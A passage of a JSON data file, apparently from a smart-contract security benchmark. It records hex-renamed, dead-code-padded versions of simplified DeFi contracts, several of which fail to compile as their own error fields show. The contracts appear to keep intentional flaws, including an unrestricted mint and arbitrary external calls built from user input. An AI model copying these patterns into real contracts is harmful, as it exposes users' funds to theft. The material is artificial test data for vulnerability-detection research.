      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x002deb, uint256 _0x6bf904) external returns (bool);\n\n    function _0x09aca0(\n        address from,\n        address _0x002deb,\n        uint256 _0x6bf904\n    ) external returns (bool);\n\n    function _0xa616d8(address _0x4f196d) external view returns (uint256);\n\n    function _0x674c71(address _0x9842d3, uint256 _0x6bf904) external returns (bool);\n}\n\ncontract ShezmuCollateralToken is IERC20 {\n        // Placeholder for future logic\n        bool _flag2 = false;\n    string public _0xd08372 = \"Shezmu Collateral Token\";\n    string public _0x96841d = \"SCT\";\n    uint8 public _0xc2f754 = 18;\n\n    mapping(address => uint256) public _0xa616d8;\n    mapping(address => mapping(address => uint256)) public _0xf1af42;\n    uint256 public _0xe49a87;\n\n    function _0x1a9687(address _0x002deb, uint256 _0x6bf904) external {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        _0xa616d8[_0x002deb] += _0x6bf904;\n        _0xe49a87 += _0x6bf904;\n    }\n\n    function transfer(\n        address _0x002deb,\n        uint256 _0x6bf904\n    ) external override returns (bool) {\n        require(_0xa616d8[msg.sender] >= _0x6bf904, \"Insufficient balance\");\n        _0xa616d8[msg.sender] -= _0x6bf904;\n        _0xa616d8[_0x002deb] += _0x6bf904;\n        return true;\n    }\n\n    function _0x09aca0(\n        address from,\n        address _0x002deb,\n        uint256 _0x6bf904\n    ) external override returns (bool) {\n        require(_0xa616d8[from] >= _0x6bf904, \"Insufficient balance\");\n        require(\n            _0xf1af42[from][msg.sender] >= _0x6bf904,\n            \"Insufficient allowance\"\n        );\n        _0xa616d8[from] -= _0x6bf904;\n        _0xa616d8[_0x002deb] += _0x6bf904;\n        _0xf1af42[from][msg.sender] -= _0x6bf904;\n        return true;\n    }\n\n    function _0x674c71(\n        address _0x9842d3,\n        uint256 _0x6bf904\n    ) external override returns (bool) {\n        _0xf1af42[msg.sender][_0x9842d3] = _0x6bf904;\n        return true;\n    }\n}\n\ncontract ShezmuVault {\n    IERC20 public _0xa80466;\n    IERC20 public _0x5e6c6d;\n\n    mapping(address => uint256) public _0xe60bb7;\n    mapping(address => uint256) public _0x04c205;\n\n    uint256 public constant COLLATERAL_RATIO = 150;\n    uint256 public constant BASIS_POINTS = 100;\n\n    constructor(address _0x4c2180, address _0x53622f) {\n        if (true) { _0xa80466 = IERC20(_0x4c2180); }\n        if (1 == 1) { _0x5e6c6d = IERC20(_0x53622f); }\n    }\n\n    function _0x2c9b8c(uint256 _0x6bf904) external {\n        _0xa80466._0x09aca0(msg.sender, address(this), _0x6bf904);\n        _0xe60bb7[msg.sender] += _0x6bf904;\n    }\n\n    function _0xf6019c(uint256 _0x6bf904) external {\n        uint256 _0x72fb39 = (_0xe60bb7[msg.sender] * BASIS_POINTS) /\n            COLLATERAL_RATIO;\n\n        require(\n            _0x04c205[msg.sender] + _0x6bf904 <= _0x72fb39,\n            \"Insufficient collateral\"\n        );\n\n        _0x04c205[msg.sender] += _0x6bf904;\n\n        _0x5e6c6d.transfer(msg.sender, _0x6bf904);\n    }\n\n    function _0xe40bbd(uint256 _0x6bf904) external {\n        require(_0x04c205[msg.sender] >= _0x6bf904, \"Excessive repayment\");\n        _0x5e6c6d._0x09aca0(msg.sender, address(this), _0x6bf904);\n        _0x04c205[msg.sender] -= _0x6bf904;\n    }\n\n    function _0xe81f1f(uint256 _0x6bf904) external {\n        require(\n            _0xe60bb7[msg.sender] >= _0x6bf904,\n            \"Insufficient collateral\"\n        );\n        uint256 _0xf17465 = _0xe60bb7[msg.sender] - _0x6bf904;\n        uint256 _0x155f86 = (_0xf17465 * BASIS_POINTS) /\n            COLLATERAL_RATIO;\n        require(\n            _0x04c205[msg.sender] <= _0x155f86,\n            \"Would be undercollateralized\"\n        );\n\n        _0xe60bb7[msg.sender] -= _0x6bf904;\n        _0xa80466.transfer(msg.sender, _0x6bf904);\n    }\n}\n",
      "rename_map": {
        "remainingCollateral": "_0xf17465",
        "withdrawCollateral": "_0xe81f1f",
        "collateralBalance": "_0xe60bb7",
        "_collateralToken": "_0x4c2180",
        "collateralToken": "_0xa80466",
        "addCollateral": "_0x2c9b8c",
        "transferFrom": "_0x09aca0",
        "totalSupply": "_0xe49a87",
        "debtBalance": "_0x04c205",
        "balanceOf": "_0xa616d8",
        "maxBorrow": "_0x72fb39",
        "allowance": "_0xf1af42",
        "_shezUSD": "_0x53622f",
        "decimals": "_0xc2f754",
        "maxDebt": "_0x155f86",
        "approve": "_0x674c71",
        "shezUSD": "_0x5e6c6d",
        "account": "_0x4f196d",
        "spender": "_0x9842d3",
        "amount": "_0x6bf904",
        "symbol": "_0x96841d",
        "borrow": "_0xf6019c",
        "repay": "_0xe40bbd",
        "mint": "_0x1a9687",
        "name": "_0xd08372",
        "to": "_0x002deb"
      },
      "changes": [
        "Renamed 26 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_042",
      "transformed_id": "ss_l4_medium_sn_tc_042",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x716859, uint256 _0xdc043b) external returns (bool);\n\n    function _0xec5728(\n        address from,\n        address _0x716859,\n        uint256 _0xdc043b\n    ) external returns (bool);\n\n    function _0x206f7b(address _0x6757df) external view returns (uint256);\n\n    function _0xce86da(address _0x5d8f5d, uint256 _0xdc043b) external returns (bool);\n}\n\nenum TokenLockup {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n    Unlocked,\n    Locked,\n    Vesting\n}\n\nstruct Campaign {\n    address _0xc7904c;\n    address _0x0ac9bb;\n    uint256 _0xdc043b;\n    uint256 _0xa78950;\n    TokenLockup _0x3025ba;\n    bytes32 _0x0df1da;\n}\n\nstruct ClaimLockup {\n    address _0x0ef056;\n    uint256 _0xdd2ac9;\n    uint256 _0x12f2a9;\n    uint256 _0xf8d394;\n    uint256 _0x1b41c8;\n}\n\nstruct Donation {\n    address _0x0ef056;\n    uint256 _0xdc043b;\n    uint256 _0x93cc44;\n    uint256 _0xdd2ac9;\n    uint256 _0x12f2a9;\n    uint256 _0xf8d394;\n}\n\ncontract HedgeyClaimCampaigns {\n    mapping(bytes16 => Campaign) public _0xd0086a;\n\n    function _0xbdcf3a(\n        bytes16 _0xfe98ad,\n        Campaign memory _0x7a3fa6,\n        ClaimLockup memory _0x7be8f2,\n        Donation memory _0xcc65b0\n    ) external {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n        require(_0xd0086a[_0xfe98ad]._0xc7904c == address(0), \"Campaign exists\");\n\n        _0xd0086a[_0xfe98ad] = _0x7a3fa6;\n\n        if (_0xcc65b0._0xdc043b > 0 && _0xcc65b0._0x0ef056 != address(0)) {\n            (bool _0x5e12f5, ) = _0xcc65b0._0x0ef056.call(\n                abi._0xe53c9d(\n                    \"createTokenLock(address,uint256,uint256,uint256,uint256,uint256)\",\n                    _0x7a3fa6._0x0ac9bb,\n                    _0xcc65b0._0xdc043b,\n                    _0xcc65b0._0xdd2ac9,\n                    _0xcc65b0._0x12f2a9,\n                    _0xcc65b0._0x93cc44,\n                    _0xcc65b0._0xf8d394\n                )\n            );\n\n            require(_0x5e12f5, \"Token lock failed\");\n        }\n    }\n\n    function _0x19b436(bytes16 _0x8e3383) external {\n        require(_0xd0086a[_0x8e3383]._0xc7904c == msg.sender, \"Not manager\");\n        delete _0xd0086a[_0x8e3383];\n    }\n}\n",
      "rename_map": {
        "createLockedCampaign": "_0xbdcf3a",
        "encodeWithSignature": "_0xe53c9d",
        "cancelCampaign": "_0x19b436",
        "transferFrom": "_0xec5728",
        "tokenLocker": "_0x0ef056",
        "claimLockup": "_0x7be8f2",
        "tokenLockup": "_0x3025ba",
        "campaignId": "_0x8e3383",
        "balanceOf": "_0x206f7b",
        "campaigns": "_0xd0086a",
        "donation": "_0xcc65b0",
        "campaign": "_0x7a3fa6",
        "manager": "_0xc7904c",
        "approve": "_0xce86da",
        "periods": "_0x1b41c8",
        "account": "_0x6757df",
        "spender": "_0x5d8f5d",
        "success": "_0x5e12f5",
        "amount": "_0xdc043b",
        "period": "_0xf8d394",
        "token": "_0x0ac9bb",
        "cliff": "_0x12f2a9",
        "start": "_0xdd2ac9",
        "rate": "_0x93cc44",
        "root": "_0x0df1da",
        "end": "_0xa78950",
        "id": "_0xfe98ad",
        "to": "_0x716859"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 19, column 17', 'Syntax error at line 21, column 5']"
    },
    {
      "original_id": "sn_tc_043",
      "transformed_id": "ss_l4_medium_sn_tc_043",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xe48c52, uint256 _0xe75f92) external returns (bool);\n\n    function _0xd26edb(\n        address from,\n        address _0xe48c52,\n        uint256 _0xe75f92\n    ) external returns (bool);\n\n    function _0x1a888e(address _0xd63308) external view returns (uint256);\n\n    function _0x8853bd(address _0x07584e, uint256 _0xe75f92) external returns (bool);\n}\n\ncontract SenecaChamber {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    uint8 public constant OPERATION_CALL = 30;\n    uint8 public constant OPERATION_DELEGATECALL = 31;\n\n    mapping(address => bool) public _0x04ca14;\n\n    function _0x06e669(\n        uint8[] memory _0xb39b42,\n        uint256[] memory _0x350d57,\n        bytes[] memory _0x24c5cf\n    ) external payable returns (uint256 _0x61d280, uint256 _0x7a1deb) {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        require(\n            _0xb39b42.length == _0x350d57.length && _0x350d57.length == _0x24c5cf.length,\n            \"Length mismatch\"\n        );\n\n        for (uint256 i = 0; i < _0xb39b42.length; i++) {\n            if (_0xb39b42[i] == OPERATION_CALL) {\n                (address _0x9ca724, bytes memory callData, , , ) = abi._0x66957e(\n                    _0x24c5cf[i],\n                    (address, bytes, uint256, uint256, uint256)\n                );\n\n                (bool _0x558a98, ) = _0x9ca724.call{value: _0x350d57[i]}(callData);\n                require(_0x558a98, \"Call failed\");\n            }\n        }\n\n        return (0, 0);\n    }\n}\n",
      "rename_map": {
        "performOperations": "_0x06e669",
        "transferFrom": "_0xd26edb",
        "vaultOwners": "_0x04ca14",
        "balanceOf": "_0x1a888e",
        "approve": "_0x8853bd",
        "spender": "_0x07584e",
        "success": "_0x558a98",
        "account": "_0xd63308",
        "actions": "_0xb39b42",
        "amount": "_0xe75f92",
        "value2": "_0x7a1deb",
        "target": "_0x9ca724",
        "decode": "_0x66957e",
        "values": "_0x350d57",
        "value1": "_0x61d280",
        "datas": "_0x24c5cf",
        "to": "_0xe48c52"
      },
      "changes": [
        "Renamed 17 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 19, column 9', 'Syntax error at line 20, column 9', 'Syntax error at line 21, column 11']"
    },
    {
      "original_id": "sn_tc_044",
      "transformed_id": "ss_l4_medium_sn_tc_044",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x013dc9, uint256 _0x57141d) external returns (bool);\n\n    function _0x83f6d6(\n        address from,\n        address _0x013dc9,\n        uint256 _0x57141d\n    ) external returns (bool);\n\n    function _0x86014a(address _0xbc4c52) external view returns (uint256);\n\n    function _0x509abb(address _0xb9104b, uint256 _0x57141d) external returns (bool);\n}\n\ninterface ISmartLoan {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    function _0x24a846(\n        bytes32 _0xb7d25b,\n        bytes32 _0x3ea69e,\n        uint256 _0x56891e,\n        uint256 _0x261a1a,\n        bytes4 selector,\n        bytes memory data\n    ) external;\n\n    function _0x71005d(address _0xa03dbc, uint256[] calldata _0xa5b0a9) external;\n}\n\ncontract SmartLoansFactory {\n        bool _flag3 = false;\n        // Placeholder for future logic\n    address public _0x0e181a;\n\n    constructor() {\n        _0x0e181a = msg.sender;\n    }\n\n    function _0x1f0680() external returns (address) {\n        SmartLoan _0xc75b98 = new SmartLoan();\n        return address(_0xc75b98);\n    }\n\n    function _0x582fbd(\n        address _0xd6c5a8,\n        address _0x9ccbdf\n    ) external {\n        require(msg.sender == _0x0e181a, \"Not admin\");\n    }\n}\n\ncontract SmartLoan is ISmartLoan {\n    mapping(bytes32 => uint256) public _0x34b854;\n    mapping(bytes32 => uint256) public _0x5e82ed;\n\n    function _0x24a846(\n        bytes32 _0xb7d25b,\n        bytes32 _0x3ea69e,\n        uint256 _0x56891e,\n        uint256 _0x261a1a,\n        bytes4 selector,\n        bytes memory data\n    ) external override {}\n\n    function _0x71005d(\n        address _0xa03dbc,\n        uint256[] calldata _0xa5b0a9\n    ) external override {\n        (bool _0x61b614, ) = _0xa03dbc.call(\n            abi._0xca7d5c(\"claimRewards(address)\", msg.sender)\n        );\n    }\n}\n",
      "rename_map": {
        "encodeWithSignature": "_0xca7d5c",
        "newImplementation": "_0x9ccbdf",
        "swapDebtParaSwap": "_0x24a846",
        "_borrowAmount": "_0x261a1a",
        "_repayAmount": "_0x56891e",
        "transferFrom": "_0x83f6d6",
        "upgradePool": "_0x582fbd",
        "claimReward": "_0x71005d",
        "_fromAsset": "_0xb7d25b",
        "createLoan": "_0x1f0680",
        "poolProxy": "_0xd6c5a8",
        "balanceOf": "_0x86014a",
        "_toAsset": "_0x3ea69e",
        "deposits": "_0x34b854",
        "approve": "_0x509abb",
        "success": "_0x61b614",
        "account": "_0xbc4c52",
        "spender": "_0xb9104b",
        "amount": "_0x57141d",
        "debts": "_0x5e82ed",
        "admin": "_0x0e181a",
        "loan": "_0xc75b98",
        "pair": "_0xa03dbc",
        "ids": "_0xa5b0a9",
        "to": "_0x013dc9"
      },
      "changes": [
        "Renamed 25 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 20, column 9', 'Syntax error at line 31, column 1']"
    },
    {
      "original_id": "sn_tc_045",
      "transformed_id": "ss_l4_medium_sn_tc_045",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x18ce20, uint256 _0xa97e5b) external returns (bool);\n\n    function _0xb4ec93(\n        address from,\n        address _0x18ce20,\n        uint256 _0xa97e5b\n    ) external returns (bool);\n\n    function _0x2b13af(address _0xb523d4) external view returns (uint256);\n\n    function _0x535df9(address _0x4e717d, uint256 _0xa97e5b) external returns (bool);\n}\n\ninterface IPendleMarket {\n        bool _flag1 = false;\n        if (false) { revert(); }\n    function _0x1c5f0f() external view returns (address[] memory);\n\n    function _0xa99e1b() external returns (uint256[] memory);\n\n    function _0x8ddf29(address _0xdb7e6c) external returns (uint256[] memory);\n}\n\ncontract PenpieStaking {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    mapping(address => mapping(address => uint256)) public _0x58db7b;\n    mapping(address => uint256) public _0xa37e5e;\n\n    function _0x72f179(address _0x551a43, uint256 _0xa97e5b) external {\n        IERC20(_0x551a43)._0xb4ec93(msg.sender, address(this), _0xa97e5b);\n        _0x58db7b[_0x551a43][msg.sender] += _0xa97e5b;\n        _0xa37e5e[_0x551a43] += _0xa97e5b;\n    }\n\n    function _0x8ddf29(address _0x551a43, address _0xdb7e6c) external {\n        uint256[] memory _0x6dfcce = IPendleMarket(_0x551a43)._0x8ddf29(_0xdb7e6c);\n\n        for (uint256 i = 0; i < _0x6dfcce.length; i++) {}\n    }\n\n    function _0x11a5b3(address _0x551a43, uint256 _0xa97e5b) external {\n        require(\n            _0x58db7b[_0x551a43][msg.sender] >= _0xa97e5b,\n            \"Insufficient balance\"\n        );\n\n        _0x58db7b[_0x551a43][msg.sender] -= _0xa97e5b;\n        _0xa37e5e[_0x551a43] -= _0xa97e5b;\n\n        IERC20(_0x551a43).transfer(msg.sender, _0xa97e5b);\n    }\n}\n\ncontract PendleMarketRegister {\n    mapping(address => bool) public _0x20c8fb;\n\n    function _0x79d760(address _0x551a43) external {\n        _0x20c8fb[_0x551a43] = true;\n    }\n}\n",
      "rename_map": {
        "rewardIndexesCurrent": "_0xa99e1b",
        "registeredMarkets": "_0x20c8fb",
        "getRewardTokens": "_0x1c5f0f",
        "registerMarket": "_0x79d760",
        "claimRewards": "_0x8ddf29",
        "userBalances": "_0x58db7b",
        "transferFrom": "_0xb4ec93",
        "totalStaked": "_0xa37e5e",
        "balanceOf": "_0x2b13af",
        "withdraw": "_0x11a5b3",
        "rewards": "_0x6dfcce",
        "approve": "_0x535df9",
        "account": "_0xb523d4",
        "deposit": "_0x72f179",
        "spender": "_0x4e717d",
        "amount": "_0xa97e5b",
        "market": "_0x551a43",
        "user": "_0xdb7e6c",
        "to": "_0x18ce20"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 20, column 9', 'Syntax error at line 26, column 1', 'Syntax error at line 29, column 9']"
    },
    {
      "original_id": "sn_tc_046",
      "transformed_id": "ss_l4_medium_sn_tc_046",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xc7b78e, uint256 _0x92e367) external returns (bool);\n\n    function _0x55509a(address _0xb6ac9e) external view returns (uint256);\n}\n\ncontract FloatHotWalletV2 {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n    address public _0x3af14f;\n\n    mapping(address => bool) public _0xcf5ad2;\n\n    event Withdrawal(address _0x269d04, address _0xc7b78e, uint256 _0x92e367);\n\n    constructor() {\n        _0x3af14f = msg.sender;\n    }\n\n    modifier _0xc34f0a() {\n        require(msg.sender == _0x3af14f, \"Not owner\");\n        _;\n    }\n\n    function _0x4140f6(\n        address _0x269d04,\n        address _0xc7b78e,\n        uint256 _0x92e367\n    ) external _0xc34f0a {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        if (_0x269d04 == address(0)) {\n            payable(_0xc7b78e).transfer(_0x92e367);\n        } else {\n            IERC20(_0x269d04).transfer(_0xc7b78e, _0x92e367);\n        }\n\n        emit Withdrawal(_0x269d04, _0xc7b78e, _0x92e367);\n    }\n\n    function _0x73dbb6(address _0x269d04) external _0xc34f0a {\n        uint256 balance;\n        if (_0x269d04 == address(0)) {\n            balance = address(this).balance;\n            payable(_0x3af14f).transfer(balance);\n        } else {\n            balance = IERC20(_0x269d04)._0x55509a(address(this));\n            IERC20(_0x269d04).transfer(_0x3af14f, balance);\n        }\n\n        emit Withdrawal(_0x269d04, _0x3af14f, balance);\n    }\n\n    function _0x686341(address _0xfe8844) external _0xc34f0a {\n        _0x3af14f = _0xfe8844;\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "authorizedOperators": "_0xcf5ad2",
        "transferOwnership": "_0x686341",
        "emergencyWithdraw": "_0x73dbb6",
        "balanceOf": "_0x55509a",
        "onlyOwner": "_0xc34f0a",
        "newOwner": "_0xfe8844",
        "withdraw": "_0x4140f6",
        "account": "_0xb6ac9e",
        "amount": "_0x92e367",
        "token": "_0x269d04",
        "owner": "_0x3af14f",
        "to": "_0xc7b78e"
      },
      "changes": [
        "Renamed 12 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 11, column 9', 'Syntax error at line 12, column 9', 'Syntax error at line 19, column 5']"
    },
    {
      "original_id": "sn_tc_047",
      "transformed_id": "ss_l4_medium_sn_tc_047",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xbf33be, uint256 _0x95fa6c) external returns (bool);\n\n    function _0x18a74c(address _0x8743e6) external view returns (uint256);\n}\n\ncontract PlayDappToken {\n        bool _flag1 = false;\n        bool _flag2 = false;\n    string public _0xaf16e1 = \"PlayDapp Token\";\n    string public _0x2868b6 = \"PLA\";\n    uint8 public _0x6db417 = 18;\n\n    uint256 public _0x7b7bc6;\n\n    address public _0x85ac4a;\n\n    mapping(address => uint256) public _0x18a74c;\n    mapping(address => mapping(address => uint256)) public _0x9fc635;\n\n    event Transfer(address indexed from, address indexed _0xbf33be, uint256 value);\n    event Approval(\n        address indexed _0xcd95fd,\n        address indexed _0x4476ac,\n        uint256 value\n    );\n    event Minted(address indexed _0xbf33be, uint256 _0x95fa6c);\n\n    constructor() {\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x85ac4a = msg.sender; }\n        _0xf1eae9(msg.sender, 700_000_000 * 10 ** 18);\n    }\n\n    modifier _0xf70bf3() {\n        require(msg.sender == _0x85ac4a, \"Not minter\");\n        _;\n    }\n\n    function _0x734f5a(address _0xbf33be, uint256 _0x95fa6c) external _0xf70bf3 {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        _0xf1eae9(_0xbf33be, _0x95fa6c);\n        emit Minted(_0xbf33be, _0x95fa6c);\n    }\n\n    function _0xf1eae9(address _0xbf33be, uint256 _0x95fa6c) internal {\n        require(_0xbf33be != address(0), \"Mint to zero address\");\n\n        _0x7b7bc6 += _0x95fa6c;\n        _0x18a74c[_0xbf33be] += _0x95fa6c;\n\n        emit Transfer(address(0), _0xbf33be, _0x95fa6c);\n    }\n\n    function _0x23bce2(address _0x22742e) external _0xf70bf3 {\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x85ac4a = _0x22742e; }\n    }\n\n    function transfer(address _0xbf33be, uint256 _0x95fa6c) external returns (bool) {\n        require(_0x18a74c[msg.sender] >= _0x95fa6c, \"Insufficient balance\");\n        _0x18a74c[msg.sender] -= _0x95fa6c;\n        _0x18a74c[_0xbf33be] += _0x95fa6c;\n        emit Transfer(msg.sender, _0xbf33be, _0x95fa6c);\n        return true;\n    }\n\n    function _0xc6691a(address _0x4476ac, uint256 _0x95fa6c) external returns (bool) {\n        _0x9fc635[msg.sender][_0x4476ac] = _0x95fa6c;\n        emit Approval(msg.sender, _0x4476ac, _0x95fa6c);\n        return true;\n    }\n\n    function _0x60fcf3(\n        address from,\n        address _0xbf33be,\n        uint256 _0x95fa6c\n    ) external returns (bool) {\n        require(_0x18a74c[from] >= _0x95fa6c, \"Insufficient balance\");\n        require(\n            _0x9fc635[from][msg.sender] >= _0x95fa6c,\n            \"Insufficient allowance\"\n        );\n\n        _0x18a74c[from] -= _0x95fa6c;\n        _0x18a74c[_0xbf33be] += _0x95fa6c;\n        _0x9fc635[from][msg.sender] -= _0x95fa6c;\n\n        emit Transfer(from, _0xbf33be, _0x95fa6c);\n        return true;\n    }\n}\n",
      "rename_map": {
        "transferFrom": "_0x60fcf3",
        "totalSupply": "_0x7b7bc6",
        "onlyMinter": "_0xf70bf3",
        "setMinter": "_0x23bce2",
        "newMinter": "_0x22742e",
        "balanceOf": "_0x18a74c",
        "allowance": "_0x9fc635",
        "decimals": "_0x6db417",
        "approve": "_0xc6691a",
        "account": "_0x8743e6",
        "spender": "_0x4476ac",
        "amount": "_0x95fa6c",
        "symbol": "_0x2868b6",
        "minter": "_0x85ac4a",
        "_mint": "_0xf1eae9",
        "owner": "_0xcd95fd",
        "mint": "_0x734f5a",
        "name": "_0xaf16e1",
        "to": "_0xbf33be"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_048",
      "transformed_id": "ss_l4_medium_sn_tc_048",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x3036ad, uint256 _0xb75dad) external returns (bool);\n\n    function _0x6ba3e9(\n        address from,\n        address _0x3036ad,\n        uint256 _0xb75dad\n    ) external returns (bool);\n\n    function _0xf527a6(address _0x628212) external view returns (uint256);\n}\n\ncontract SonneMarket {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n    IERC20 public _0xbe2895;\n\n    string public _0xead6a4 = \"Sonne WETH\";\n    string public _0x040b93 = \"soWETH\";\n    uint8 public _0xa00dab = 8;\n\n    uint256 public _0xbc496b;\n    mapping(address => uint256) public _0xf527a6;\n\n    uint256 public _0xc83a69;\n    uint256 public _0xf95258;\n\n    event Mint(address _0x056363, uint256 _0xce2bdc, uint256 _0x8ff9e1);\n    event Redeem(address _0x730f96, uint256 _0x67d115, uint256 _0xafee02);\n\n    constructor(address _0x6edd78) {\n        _0xbe2895 = IERC20(_0x6edd78);\n    }\n\n    function _0x08582b() public view returns (uint256) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if (_0xbc496b == 0) {\n            return 1e18;\n        }\n\n        uint256 _0x3c3f4d = _0xbe2895._0xf527a6(address(this));\n\n        uint256 _0x053be5 = _0x3c3f4d + _0xc83a69 - _0xf95258;\n\n        return (_0x053be5 * 1e18) / _0xbc496b;\n    }\n\n    function _0xe980be(uint256 _0xce2bdc) external returns (uint256) {\n        require(_0xce2bdc > 0, \"Zero mint\");\n\n        uint256 _0x7f2c4f = _0x08582b();\n\n        uint256 _0x8ff9e1 = (_0xce2bdc * 1e18) / _0x7f2c4f;\n\n        _0xbc496b += _0x8ff9e1;\n        _0xf527a6[msg.sender] += _0x8ff9e1;\n\n        _0xbe2895._0x6ba3e9(msg.sender, address(this), _0xce2bdc);\n\n        emit Mint(msg.sender, _0xce2bdc, _0x8ff9e1);\n        return _0x8ff9e1;\n    }\n\n    function _0x4b42c3(uint256 _0xafee02) external returns (uint256) {\n        require(_0xf527a6[msg.sender] >= _0xafee02, \"Insufficient balance\");\n\n        uint256 _0x7f2c4f = _0x08582b();\n\n        uint256 _0x67d115 = (_0xafee02 * _0x7f2c4f) / 1e18;\n\n        _0xf527a6[msg.sender] -= _0xafee02;\n        _0xbc496b -= _0xafee02;\n\n        _0xbe2895.transfer(msg.sender, _0x67d115);\n\n        emit Redeem(msg.sender, _0x67d115, _0xafee02);\n        return _0x67d115;\n    }\n\n    function _0x36a138(\n        address _0x628212\n    ) external view returns (uint256) {\n        uint256 _0x7f2c4f = _0x08582b();\n\n        return (_0xf527a6[_0x628212] * _0x7f2c4f) / 1e18;\n    }\n}\n",
      "rename_map": {
        "exchangeRateMantissa": "_0x7f2c4f",
        "balanceOfUnderlying": "_0x36a138",
        "totalUnderlying": "_0x053be5",
        "totalReserves": "_0xf95258",
        "exchangeRate": "_0x08582b",
        "transferFrom": "_0x6ba3e9",
        "totalBorrows": "_0xc83a69",
        "redeemTokens": "_0xafee02",
        "redeemAmount": "_0x67d115",
        "totalSupply": "_0xbc496b",
        "_underlying": "_0x6edd78",
        "mintAmount": "_0xce2bdc",
        "mintTokens": "_0x8ff9e1",
        "underlying": "_0xbe2895",
        "balanceOf": "_0xf527a6",
        "redeemer": "_0x730f96",
        "decimals": "_0xa00dab",
        "account": "_0x628212",
        "amount": "_0xb75dad",
        "symbol": "_0x040b93",
        "minter": "_0x056363",
        "redeem": "_0x4b42c3",
        "mint": "_0xe980be",
        "cash": "_0x3c3f4d",
        "name": "_0xead6a4",
        "to": "_0x3036ad"
      },
      "changes": [
        "Renamed 26 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_049",
      "transformed_id": "ss_l4_medium_sn_tc_049",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x9dbb82, uint256 _0x68ed60) external returns (bool);\n\n    function _0x4c7b1a(\n        address from,\n        address _0x9dbb82,\n        uint256 _0x68ed60\n    ) external returns (bool);\n\n    function _0xed23e3(address _0x3bc482) external view returns (uint256);\n}\n\ninterface IMarket {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n    function _0xa5a888(\n        address _0x3bc482\n    )\n        external\n        view\n        returns (uint256 _0x889a84, uint256 _0x746b3e, uint256 _0x31423e);\n}\n\ncontract DebtPreviewer {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n    function _0xc92b3e(\n        address _0x8d80bf,\n        address _0x3bc482\n    )\n        external\n        view\n        returns (\n            uint256 _0x82f3b3,\n            uint256 _0x9059e1,\n            uint256 _0xb4f329\n        )\n    {\n        (uint256 _0x889a84, uint256 _0x746b3e, uint256 _0x31423e) = IMarket(\n            _0x8d80bf\n        )._0xa5a888(_0x3bc482);\n\n        _0x82f3b3 = (_0x889a84 * _0x31423e) / 1e18;\n        _0x9059e1 = _0x746b3e;\n\n        if (_0x9059e1 == 0) {\n            _0xb4f329 = type(uint256)._0xb1dcd2;\n        } else {\n            _0xb4f329 = (_0x82f3b3 * 1e18) / _0x9059e1;\n        }\n\n        return (_0x82f3b3, _0x9059e1, _0xb4f329);\n    }\n\n    function _0xf86c24(\n        address[] calldata _0x1553cb,\n        address 